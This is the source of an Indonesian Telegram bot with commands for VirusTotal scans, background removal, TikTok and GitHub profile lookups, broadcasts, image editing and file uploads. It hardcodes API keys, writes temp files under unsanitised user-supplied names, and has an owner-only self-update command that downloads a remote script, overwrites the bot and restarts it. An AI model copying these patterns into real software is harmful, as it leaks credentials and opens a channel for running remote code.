bot.onText(/\/virustotal/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const replyMsg = msg.reply_to_message;

    // =======================================
    // (7) ANTI-SPAM: 15 DETIK COOLDOWN
    // =======================================
    const now = Date.now();
    const cd = cooldown.get(userId);
    if (cd && now - cd < 15000) {
        const sisa = ((15000 - (now - cd)) / 1000).toFixed(1);
        return bot.sendMessage(chatId, `⏳ Tunggu ${sisa} detik sebelum scan lagi.`);
    }
    cooldown.set(userId, now);

    // Cek API Key (PERBAIKAN)
if (!VTOTAL_APIKEY || VTOTAL_APIKEY.length < 20) {
    return bot.sendMessage(chatId, "❌ API Key belum diatur atau tidak valid.");
}

    if (!replyMsg || !replyMsg.document) {
        return bot.sendMessage(
            chatId,
            "❌ *Format Salah!*\nReply sebuah file lalu kirim /virustotal",
            { parse_mode: "Markdown" }
        );
    }

    const file = replyMsg.document;

    // =======================================
    // (4) CEK LIMIT SIZE (32MB)
    // =======================================
    if (file.file_size > 32 * 1024 * 1024) {
        return bot.sendMessage(
            chatId,
            `❌ *Ukuran file terlalu besar!*\nBatas VirusTotal Free: *32MB*\nUkuran file: ${(file.file_size/1024/1024).toFixed(2)} MB`,
            { parse_mode: "Markdown" }
        );
    }

    // =======================================
    // (3) PROGRESS LOADING
    // =======================================
    const stepMsg = await bot.sendMessage(chatId, "🔄 Mengunduh file dari Telegram...");

    try {
        // Download file dari Telegram
        const fileLink = await bot.getFileLink(file.file_id);
        const fileBuffer = await axios.get(fileLink, { responseType: "arraybuffer" });

        await bot.editMessageText("🗂️ Menyimpan file sementara...", { chat_id: chatId, message_id: stepMsg.message_id });

        const fileName = file.file_name || `file_${Date.now()}`;
        const tempPath = `./temp_${fileName}`;
        fs.writeFileSync(tempPath, fileBuffer.data);

        // Upload ke VirusTotal
        await bot.editMessageText("📤 Mengupload file ke VirusTotal...", { chat_id: chatId, message_id: stepMsg.message_id });

        const form = new FormData();
        form.append("file", fs.createReadStream(tempPath));

        const upload = await axios.post("https://www.virustotal.com/api/v3/files", form, {
            headers: { ...form.getHeaders(), "x-apikey": VTOTAL_APIKEY },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });

        const analysisId = upload.data.data.id;
        await bot.editMessageText(
            `🧪 File diupload.\nID Analisis: \`${analysisId}\`\nMenunggu hasil...`,
            { chat_id: chatId, message_id: stepMsg.message_id, parse_mode: "Markdown" }
        );

        // Cek hasil
        let result;
        for (let i = 0; i < 5; i++) {
            const check = await axios.get(
                `https://www.virustotal.com/api/v3/analyses/${analysisId}`,
                { headers: { "x-apikey": VTOTAL_APIKEY } }
            );

            if (check.data.data.attributes.status === "completed") {
                result = check.data.data;
                break;
            }
            await new Promise(res => setTimeout(res, 6000));
        }

        if (!result) {
            fs.unlinkSync(tempPath);
            return bot.editMessageText("❌ Gagal mengambil hasil analisis.", {
                chat_id: chatId,
                message_id: stepMsg.message_id
            });
        }

        const stats = result.attributes.stats;
        const info = result.meta.file_info;
        const reportUrl = `https://www.virustotal.com/gui/file/${info.sha256}`;

        // =======================================
        // (8) THUMBNAIL STATUS
        // =======================================
        const status =
            stats.malicious > 0 ? "🔥 MALICIOUS"
            : stats.suspicious > 0 ? "⚠️ SUSPICIOUS"
            : "✅ CLEAN";

        const thumbCaption = `
🛡️ *VirusTotal Scan Result* 🛡️

*Status:* ${status}
*Nama:* ${fileName}
*Ukuran:* ${(info.size/1024/1024).toFixed(2)} MB
*SHA256:* \`${info.sha256}\`

Malicious: ${stats.malicious}
Suspicious: ${stats.suspicious}
Undetected: ${stats.undetected}

🔗 Laporan: ${reportUrl}
        `;

        // gambar thumbnail hasil (emoji background)
        const thumbnailBuffer = Buffer.from(
`🔥🔥🔥🔥🔥🔥🔥
🔥   ${status}   🔥
🔥🔥🔥🔥🔥🔥🔥`
        );

        bot.sendPhoto(chatId, thumbnailBuffer, { caption: thumbCaption, parse_mode: "Markdown" });

        // =======================================
        // (2) KIRIM FILE TXT LAPORAN
        // =======================================
        const txtContent = `
=== VirusTotal Scan Report ===

File: ${fileName}
Size: ${(info.size/1024/1024).toFixed(2)} MB
SHA256: ${info.sha256}

Malicious: ${stats.malicious}
Suspicious: ${stats.suspicious}
Undetected: ${stats.undetected}

URL Report:
${reportUrl}

Generated by Telegram Bot
`;

        const txtPath = `./report_${Date.now()}.txt`;
        fs.writeFileSync(txtPath, txtContent);

        await bot.sendDocument(chatId, txtPath, { caption: "📄 Laporan lengkap dalam TXT" });

        // =======================================
        // (9) AUTO DELETE FILE TEMP
        // =======================================
        fs.unlinkSync(tempPath);
        fs.unlinkSync(txtPath);

        bot.deleteMessage(chatId, stepMsg.message_id);

    } catch (e) {
        console.error(e);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat scan file.");
    }
});

// ===== CASE REMOVE BG (TELEGRAM) =====
bot.onText(/\/removebg/, async (msg) => {
  const chatId = msg.chat.id;

  // Jika user tidak reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, "📸 *Silakan reply foto yang ingin dihapus background-nya.*", {
      parse_mode: "Markdown",
    });
  }

  try {
    bot.sendMessage(chatId, "⏳ Sedang menghapus background...");

    // Ambil resolusi foto terbesar
    const photo = msg.reply_to_message.photo.pop();
    const fileLink = await bot.getFileLink(photo.file_id);

    // Request ke API remove.bg
    const response = await axios({
      method: "POST",
      url: "https://api.remove.bg/v1.0/removebg",
      data: {
        image_url: fileLink.href || fileLink,
        size: "auto",
      },
      headers: {
        "X-Api-Key": REMOVE_BG_KEY,
      },
      responseType: "arraybuffer",
    });

    // Simpan hasil
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

    // Kirim ke user
    await bot.sendPhoto(chatId, filePath, { caption: "✨ Background berhasil dihapus!" });

    // Hapus file dari server
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghapus background.\nPastikan API key benar.");
  }
});

bot.onText(/^\/tiktokstalk(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];

  if (!username) {
    return bot.sendMessage(chatId, "❌ Masukkan username TikTok!\nContoh: /tiktokstalk jarzz268");
  }

  try {
    const { data } = await axios.post("https://api.siputzx.my.id/api/stalk/tiktok", {
      username,
    });

    if (!data.status) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data TikTok.");
    }

    const user = data.data.user;
    const stats = data.data.stats;

    const caption = `
👤 *${user.nickname}* (@${user.uniqueId})
🆔 ID: \`${user.id}\`
✅ Verified: ${user.verified ? "Yes" : "No"}
📍 Region: ${user.region}
📝 Bio: ${user.signature || "-"}
📆 Dibuat: ${new Date(user.createTime * 1000).toLocaleDateString("id-ID")}

📊 *Statistik TikTok*
👥 Followers: ${stats.followerCount.toLocaleString()}
👣 Following: ${stats.followingCount.toLocaleString()}
❤️ Likes: ${stats.heart.toLocaleString()}
🎞️ Video: ${stats.videoCount.toLocaleString()}
👫 Friends: ${stats.friendCount.toLocaleString()}
•    sᴇᴀʀᴄʜ ʙʏ ᴊᴀʀᴢx`.trim();

    await bot.sendPhoto(chatId, user.avatarLarger, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "🚫 Terjadi kesalahan saat mengambil data.");
  }
});

// ===== BRATNIME ===== //
bot.onText(/\/bratanime (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const teks = match[1]; // isi teks setelah command

    try {
        if (!teks) return bot.sendMessage(chatId, "Teksnya mana?");

        // Pesan loading
        const loading = await bot.sendMessage(chatId, "wet..");

        // Fetch API
        const url = `https://ryuu-endss-api.vercel.app/tools/bratnime?text=${encodeURIComponent(teks)}&apikey=RyuuGanteng`;
        const res = await fetch(url);

        if (!res.ok) throw new Error("Gagal ambil API");

        const buffer = Buffer.from(await res.arrayBuffer());

        // Kirim sticker
        await bot.sendSticker(chatId, buffer);

        // Hapus pesan loading
        bot.deleteMessage(chatId, loading.message_id);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "cuih eror, fix dulu noh.");
    }
});

bot.onText(/\/bc/, async (msg) => {
    const chatId = msg.chat.id;

    // Cek hanya owner
    if (msg.from.id !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan broadcast.");
    }

    // Harus reply ke pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, "❌ Reply sebuah pesan untuk di-broadcast.\nContoh:\nBalas pesan lalu ketik /bc");
    }

    const users = getUsers();
    let sukses = 0;
    let gagal = 0;

    bot.sendMessage(chatId, `🚀 Broadcast dimulai...\nTotal user: ${users.length}`);

    // Mendeteksi jenis pesan
    const reply = msg.reply_to_message;

    for (let id of users) {
        try {
            if (reply.text) {
                await bot.sendMessage(id, reply.text);
            } 
            else if (reply.photo) {
                await bot.sendPhoto(id, reply.photo[reply.photo.length - 1].file_id, {
                    caption: reply.caption || ""
                });
            } 
            else if (reply.video) {
                await bot.sendVideo(id, reply.video.file_id, {
                    caption: reply.caption || ""
                });
            }
            else if (reply.document) {
                await bot.sendDocument(id, reply.document.file_id, {
                    caption: reply.caption || ""
                });
            }
            else if (reply.audio) {
                await bot.sendAudio(id, reply.audio.file_id, {
                    caption: reply.caption || ""
                });
            }
            else if (reply.voice) {
                await bot.sendVoice(id, reply.voice.file_id);
            }
            else {
                gagal++;
                continue;
            }

            sukses++;

            // Anti-limit → delay 300ms
            await new Promise(r => setTimeout(r, 300));

        } catch (e) {
            gagal++;
        }
    }

    bot.sendMessage(
        chatId,
        `🎉 Broadcast selesai!\n\n✅ Terkirim: ${sukses}\n❌ Gagal: ${gagal}`
    );
});

const FLUX_APIKEY = "fe0673140730aa18c5c1fb8b465d51a6";
const uploadImage = require("./lib/uploadImage.js");
bot.onText(/\/fluxkontext (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  // Cek apakah user reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, "❌ *Reply foto terlebih dahulu!*\nLalu kirim:\n`/fluxkontext gaya anime`");
  }

  bot.sendMessage(chatId, "⏳ Sedang memproses...");

  try {
    // Ambil file foto dari Telegram
    const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
    const fileUrl = await bot.getFileLink(fileId);

    // Upload ke server hosting (jika pakai uploadImage sendiri)
    // tapi API ini biasanya tidak butuh uploadImage
    const imageUrl = fileUrl;  

    // Fetch ke API FluxKontext
    const apiUrl = `https://api.nekolabs.web.id/image-generation/flux/kontext/v2`;

    const response = await fetch(`${apiUrl}?apikey=${FLUX_APIKEY}&prompt=${encodeURIComponent(prompt)}&imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await response.json();

    if (!data.result) {
      return bot.sendMessage(chatId, "❌ API tidak mengembalikan gambar.");
    }

    // Kirim hasil
    await bot.sendPhoto(chatId, data.result, {
      caption: `✅ *Flux Kontext AI*\n📝 Prompt: ${prompt}`
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan:\n" + err.message);
  }
});

bot.onText(/\/paptt/, async (msg) => {
    const chatId = msg.chat.id;

    const paptt = [
        "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
        "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
        "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
        "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
        "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
        "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
        "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
        "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
        "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
        "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
        "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
        "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
        "https://telegra.ph/file/267744a1a8c897b1636b9.jpg"
    ];

    const url = paptt[Math.floor(Math.random() * paptt.length)];

    try {
        if (url.endsWith(".mp4")) {
            await bot.sendVideo(chatId, url, {
                caption: "Tch, dasar sangean"
            });
        } else {
            await bot.sendPhoto(chatId, url, {
                caption: "Tch, dasar sangean"
            });
        }
    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal mengirim media.");
        console.error(err);
    }
});

// Listener untuk command /ghstalk atau /githubstalk
bot.onText(/\/(ghstalk|githubstalk) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const user = match[2]; // Username setelah command

    // Reaksi sementara loading
    bot.sendMessage(chatId, '⏱️ Mengambil data GitHub...');

    async function githubstalk(user) {
        try {
            const response = await axios.get(`https://api.github.com/users/${user}`);
            const data = response.data;

            return {
                username: data.login,
                nickname: data.name,
                bio: data.bio,
                id: data.id,
                nodeId: data.node_id,
                profile_pic: data.avatar_url,
                url: data.html_url,
                type: data.type,
                admin: data.site_admin,
                company: data.company,
                blog: data.blog,
                location: data.location,
                email: data.email,
                public_repo: data.public_repos,
                public_gists: data.public_gists,
                followers: data.followers,
                following: data.following,
                created_at: data.created_at,
                updated_at: data.updated_at
            };
        } catch (error) {
            console.error("Github stalk error:", error);
            throw new Error(`Gagal mengambil data dari GitHub API untuk user ${user}`);
        }
    }

    try {
        const aj = await githubstalk(user);

        // Kirim foto profil + info
        bot.sendPhoto(chatId, aj.profile_pic, {
            caption: `*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.created_at}
Updated At : ${aj.updated_at}`
        });

    } catch (error) {
        console.error("Error in ghstalk command:", error);
        bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
    }
});

bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});
// ==================== AUTO UPDATE SYSTEM ====================
// Tambahkan ini di paling bawah file V2Jarzx.js

const UPDATE_CONFIG = {
  url: "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/version.json",
  scriptPath: path.resolve(__dirname, "V2Jarzx.js"),
  backupDir: path.resolve(__dirname, "backups")
};

// Buat folder backup kalau belum ada
if (!fs.existsSync(UPDATE_CONFIG.backupDir)) {
  fs.mkdirSync(UPDATE_CONFIG.backupDir, { recursive: true });
}

bot.onText(/^\/ubdatenew$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek owner (pakai sistem yang ada)
  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa update!");
  }

  let statusMsg;
  try {
    statusMsg = await bot.sendMessage(chatId, "⏳ *Mengecek update...*", {
      parse_mode: "Markdown"
    });

    // Step 1: Cek versi remote
    await bot.editMessageText("🔍 Cek versi terbaru...", {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    const { data: remote } = await axios.get(UPDATE_CONFIG.url, { timeout: 10000 });
    const localVersion = JSON.parse(fs.readFileSync("./package.json")).version || "1.0.0";

    if (remote.version === localVersion) {
      return bot.editMessageText("✅ Sudah versi terbaru!", {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    // Step 2: Backup
    await bot.editMessageText("💾 Backup file...", {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    const backupPath = path.join(UPDATE_CONFIG.backupDir, `backup_${Date.now()}.js`);
    fs.copyFileSync(UPDATE_CONFIG.scriptPath, backupPath);

    // Step 3: Download & verify
    await bot.editMessageText("📥 Download update...", {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    const { data: newScript } = await axios.get(remote.download_url, { timeout: 30000 });

    // Verify checksum
    const hash = crypto.createHash("sha256").update(newScript).digest("hex");
    if (hash !== remote.checksum) {
      throw new Error("Checksum tidak valid!");
    }

    // Step 4: Install
    await bot.editMessageText("🔄 Install update...", {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    fs.writeFileSync(UPDATE_CONFIG.scriptPath, newScript, "utf-8");

    // Update package.json
    const pkg = JSON.parse(fs.readFileSync("./package.json"));
    pkg.version = remote.version;
    fs.writeFileSync("./package.json", JSON.stringify(pkg, null, 2));

    // Step 5: Restart
    await bot.editMessageText("🚀 Restart bot...", {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });

    // Restart method detection
    const { exec } = require("child_process");
    
    // Cek jika pakai PM2
    exec("pm2 list", (err, stdout) => {
      if (!err && stdout.includes("V2Jarzx")) {
        return exec("pm2 restart V2Jarzx");
      }
      
      // Cek systemd
      exec("systemctl is-active bot", (err2) => {
        if (!err2) {
          return exec("systemctl restart bot");
        }
        
        // Fallback
        bot.sendMessage(chatId, "✅ Update selesai! Restart manual: npm start");
        process.exit(0);
      });
    });

  } catch (error) {
    console.error("Update Error:", error);
    bot.editMessageText(
      `❌ Update Gagal!\n${error.message}`,
      { chat_id: chatId, message_id: statusMsg.message_id }
    );
  }
});

// ==================== END AUTO UPDATE ====================
